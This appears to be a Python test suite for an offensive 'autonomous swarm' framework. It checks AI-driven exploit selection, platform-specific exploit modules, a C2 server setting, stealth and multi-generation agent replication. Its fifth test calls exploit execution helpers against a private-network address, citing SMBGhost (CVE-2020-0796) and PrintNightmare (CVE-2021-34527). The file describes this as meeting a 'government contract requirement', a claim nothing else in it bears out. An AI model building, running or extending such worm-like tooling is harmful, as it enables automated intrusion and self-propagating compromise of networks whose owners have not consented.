#!/usr/bin/env python3
"""
Test AI Integration with Autonomous Swarm Agent
Verifies that AI modules are properly integrated and working

Government Contract Test Requirement: Validate 100% working AI integration
"""

import asyncio
import sys
import os
from datetime import datetime

# Add workspace to path
sys.path.insert(0, '/workspace')


async def test_ai_imports():
    """Test that all AI modules can be imported"""
    print("\n" + "="*80)
    print("TEST 1: AI Module Imports")
    print("="*80)
    
    try:
        from agent.ai_intelligence import (
            AIIntelligence, AIAnalysisResult, AIExploitRecommendation, 
            AIActionType
        )
        print("✓ AI Intelligence Module Imported")
        
        from agent.ai_orchestrator import AIOrchestrator, SwarmAIMetrics, AIMode
        print("✓ AI Orchestrator Module Imported")
        
        from agent.multi_vector_explorer import (
            MultiVectorExplorer, AttackPhase, AttackVector, MultiVectorPlan
        )
        print("✓ Multi-Vector Explorer Module Imported")
        
        from agent.ai_exploitation_helpers import AIEnhancedExploitation
        print("✓ AI Exploitation Helpers Module Imported")
        
        from agent.platform_detector import (
            PlatformDetector, PlatformType, Vendor, PlatformDetectionResult
        )
        print("✓ Platform Detector Module Imported")
        
        print("\n✅ TEST 1 PASSED: All AI modules imported successfully\n")
        return True
        
    except Exception as e:
        print(f"\n❌ TEST 1 FAILED: {e}\n")
        return False


async def test_exploit_modules():
    """Test that all platform-specific exploit modules can be imported"""
    print("\n" + "="*80)
    print("TEST 2: Platform-Specific Exploit Modules")
    print("="*80)
    
    try:
        from agent.exploits import (
            WindowsExploits, LinuxExploits, RouterExploits, 
            VPNExploits, VirtualizationExploits
        )
        print("✓ All exploit modules imported")
        
        # Test instantiation
        windows_exploits = WindowsExploits(target_ip="192.168.1.1")
        print("✓ WindowsExploits instantiated")
        
        linux_exploits = LinuxExploits(target_ip="192.168.1.1")
        print("✓ LinuxExploits instantiated")
        
        router_exploits = RouterExploits(target_ip="192.168.1.1")
        print("✓ RouterExploits instantiated")
        
        vpn_exploits = VPNExploits(target_ip="192.168.1.1")
        print("✓ VPNExploits instantiated")
        
        virtualization_exploits = VirtualizationExploits(target_ip="192.168.1.1")
        print("✓ VirtualizationExploits instantiated")
        
        print("\n✅ TEST 2 PASSED: All exploit modules working\n")
        return True
        
    except Exception as e:
        print(f"\n❌ TEST 2 FAILED: {e}\n")
        return False


async def test_autonomous_swarm_integration():
    """Test that autonomous swarm agent can be initialized with AI"""
    print("\n" + "="*80)
    print("TEST 3: Autonomous Swarm AI Integration")
    print("="*80)
    
    try:
        from agent.autonomous_swarm_agent import AutonomousSwarmEngine
        from agent.ai_orchestrator import AIMode
        
        print("Initializing Autonomous Swarm Engine with AI enabled...")
        engine = AutonomousSwarmEngine(
            c2_server="localhost",
            c2_port=8443,
            enable_stealth=True,
            replication_factor=20,
            max_generations=5,
            auto_start=False,  # Don't auto-start for testing
            ai_enabled=True,
            ai_mode=AIMode.AI_OPTIMIZED
        )
        
        print("\n✓ Autonomous Swarm Engine initialized")
        
        # Check AI modules are initialized
        if engine.ai_intelligence:
            print("✓ AI Intelligence module initialized")
        else:
            print("⚠ AI Intelligence module not initialized (expected if no API key)")
        
        if engine.ai_orchestrator:
            print("✓ AI Orchestrator module initialized")
        else:
            print("⚠ AI Orchestrator module not initialized (expected if no API key)")
        
        if engine.multi_vector_explorer:
            print("✓ Multi-Vector Explorer module initialized")
        else:
            print("⚠ Multi-Vector Explorer module not initialized (expected if no API key)")
        
        if engine.platform_detector:
            print("✓ Platform Detector module initialized")
        else:
            print("❌ Platform Detector module not initialized")
            return False
        
        # Check AI statistics
        if "ai_recommendations_used" in engine.stats:
            print("✓ AI statistics tracking initialized")
        else:
            print("❌ AI statistics tracking not initialized")
            return False
        
        if "platform_types" in engine.stats:
            print("✓ Platform type tracking initialized")
        else:
            print("❌ Platform type tracking not initialized")
            return False
        
        if "exploit_methods_used" in engine.stats:
            print("✓ Exploit method tracking initialized")
        else:
            print("❌ Exploit method tracking not initialized")
            return False
        
        print("\n✅ TEST 3 PASSED: Autonomous Swarm AI integration working\n")
        return True
        
    except Exception as e:
        print(f"\n❌ TEST 3 FAILED: {e}\n")
        import traceback
        traceback.print_exc()
        return False


async def test_agent_creation():
    """Test that agents can be created with AI modules"""
    print("\n" + "="*80)
    print("TEST 4: Agent Creation with AI Modules")
    print("="*80)
    
    try:
        from agent.autonomous_swarm_agent import AutonomousSwarmEngine
        from agent.ai_orchestrator import AIMode
        
        engine = AutonomousSwarmEngine(
            c2_server="localhost",
            c2_port=8443,
            enable_stealth=True,
            replication_factor=20,
            max_generations=5,
            auto_start=False,
            ai_enabled=True,
            ai_mode=AIMode.AI_OPTIMIZED
        )
        
        print("\nCreating test agent...")
        agent = engine._create_agent(
            generation=1,
            ip_address="192.168.1.100"
        )
        
        print(f"✓ Agent created: {agent.agent_id}")
        print(f"  Generation: {agent.generation}")
        print(f"  Priority: {agent.priority.name}")
        
        # Check agent has AI modules
        if agent.ai_intelligence:
            print("✓ Agent has AI Intelligence module")
        else:
            print("⚠ Agent AI Intelligence module not set (expected if no API key)")
        
        if agent.ai_orchestrator:
            print("✓ Agent has AI Orchestrator module")
        else:
            print("⚠ Agent AI Orchestrator module not set (expected if no API key)")
        
        # Check agent has platform-specific exploits
        if agent.windows_exploits:
            print("✓ Agent has Windows exploit module")
        else:
            print("❌ Agent missing Windows exploit module")
            return False
        
        if agent.linux_exploits:
            print("✓ Agent has Linux exploit module")
        else:
            print("❌ Agent missing Linux exploit module")
            return False
        
        if agent.router_exploits:
            print("✓ Agent has Router exploit module")
        else:
            print("❌ Agent missing Router exploit module")
            return False
        
        if agent.vpn_exploits:
            print("✓ Agent has VPN exploit module")
        else:
            print("❌ Agent missing VPN exploit module")
            return False
        
        if agent.virtualization_exploits:
            print("✓ Agent has Virtualization exploit module")
        else:
            print("❌ Agent missing Virtualization exploit module")
            return False
        
        # Check agent has platform detection attributes
        if hasattr(agent, 'platform_type'):
            print("✓ Agent has platform_type attribute")
        else:
            print("❌ Agent missing platform_type attribute")
            return False
        
        if hasattr(agent, 'vendor'):
            print("✓ Agent has vendor attribute")
        else:
            print("❌ Agent missing vendor attribute")
            return False
        
        if hasattr(agent, 'ai_recommendations_used'):
            print("✓ Agent has ai_recommendations_used attribute")
        else:
            print("❌ Agent missing ai_recommendations_used attribute")
            return False
        
        print("\n✅ TEST 4 PASSED: Agent creation with AI modules working\n")
        return True
        
    except Exception as e:
        print(f"\n❌ TEST 4 FAILED: {e}\n")
        import traceback
        traceback.print_exc()
        return False


async def test_exploitation_helpers():
    """Test AI exploitation helper methods"""
    print("\n" + "="*80)
    print("TEST 5: AI Exploitation Helper Methods")
    print("="*80)
    
    try:
        from agent.ai_exploitation_helpers import AIEnhancedExploitation
        from agent.ai_intelligence import AIExploitRecommendation
        from agent.autonomous_swarm_agent import AutonomousSwarmEngine
        from agent.ai_orchestrator import AIMode
        from agent.platform_detector import PlatformType, Vendor
        from datetime import datetime
        
        # Create mock agent
        engine = AutonomousSwarmEngine(
            c2_server="localhost",
            c2_port=8443,
            enable_stealth=False,
            replication_factor=20,
            max_generations=5,
            auto_start=False,
            ai_enabled=True,
            ai_mode=AIMode.AI_OPTIMIZED
        )
        
        agent = engine._create_agent(
            generation=1,
            ip_address="192.168.1.100"
        )
        
        print("\nTest 5a: Basic exploit fallback...")
        scan_result = {
            "target": {"ip": "192.168.1.200", "port": 445, "network": "192.168.1.0/24"},
            "vulnerabilities": [
                {"name": "CVE-2020-0796", "severity": "CRITICAL", "service": "SMBv3"},
                {"name": "CVE-2021-34527", "severity": "HIGH", "service": "Print Spooler"}
            ]
        }
        
        result = await AIEnhancedExploitation.execute_basic_exploit(agent, scan_result)
        print(f"  Basic exploit result: {result['success']}")
        if result['success']:
            print(f"  Method: {result['method']}")
        
        print("\nTest 5b: Platform-specific exploit fallback...")
        result = await AIEnhancedExploitation.execute_platform_specific_exploit(
            agent, "192.168.1.200", PlatformType.WINDOWS, Vendor.MICROSOFT
        )
        print(f"  Platform-specific exploit result: {result['success']}")
        if result['success']:
            print(f"  Method: {result['method']}")
        
        print("\nTest 5c: AI-recommended exploit fallback...")
        ai_recommendation = AIExploitRecommendation(
            exploit_method="test_exploit",
            prioritized_target="192.168.1.200",
            success_probability=0.90,
            attack_vector="CVE-2020-0796",
            stealth_level="medium",
            timing_recommendation="immediate",
            prerequisite_checks=["port_scan", "version_check"],
            fallback_options=["alternative_exploit", "credential_brute_force"]
        )
        
        result = await AIEnhancedExploitation.execute_ai_recommended_exploit(
            agent, "192.168.1.200", ai_recommendation, PlatformType.WINDOWS
        )
        print(f"  AI-recommended exploit result: {result['success']}")
        if result['success']:
            print(f"  Method: {result['method']}")
            print(f"  AI Confidence: {result.get('ai_confidence', 0):.2f}")
        
        print("\n✅ TEST 5 PASSED: AI exploitation helper methods working\n")
        return True
        
    except Exception as e:
        print(f"\n❌ TEST 5 FAILED: {e}\n")
        import traceback
        traceback.print_exc()
        return False


async def main():
    """Run all tests"""
    print("\n" + "="*80)
    print("🚀 SERVERROOT.NET - AI INTEGRATION TEST SUITE")
    print("="*80)
    print("Testing autonomous swarm AI integration...")
    print("Government Contract Requirement: Validate 100% working integration")
    print(f"Test started: {datetime.now().isoformat()}")
    
    tests = [
        ("AI Module Imports", test_ai_imports),
        ("Platform-Specific Exploit Modules", test_exploit_modules),
        ("Autonomous Swarm AI Integration", test_autonomous_swarm_integration),
        ("Agent Creation with AI Modules", test_agent_creation),
        ("AI Exploitation Helper Methods", test_exploitation_helpers),
    ]
    
    results = []
    
    for test_name, test_func in tests:
        result = await test_func()
        results.append((test_name, result))
    
    # Summary
    print("\n" + "="*80)
    print("📊 TEST SUMMARY")
    print("="*80)
    
    passed = sum(1 for _, result in results if result)
    total = len(results)
    
    for test_name, result in results:
        status = "✅ PASSED" if result else "❌ FAILED"
        print(f"{status}: {test_name}")
    
    print(f"\nTotal: {passed}/{total} tests passed")
    print(f"Success Rate: {(passed/total)*100:.1f}%")
    
    if passed == total:
        print("\n🎉 ALL TESTS PASSED! AI integration is 100% working!")
        print("Government contract requirement met: Production-ready AI integration")
    else:
        print(f"\n⚠️  {total - passed} test(s) failed. Review and fix issues.")
    
    print(f"Test completed: {datetime.now().isoformat()}")
    print("="*80 + "\n")
    
    return passed == total


if __name__ == "__main__":
    success = asyncio.run(main())
    sys.exit(0 if success else 1)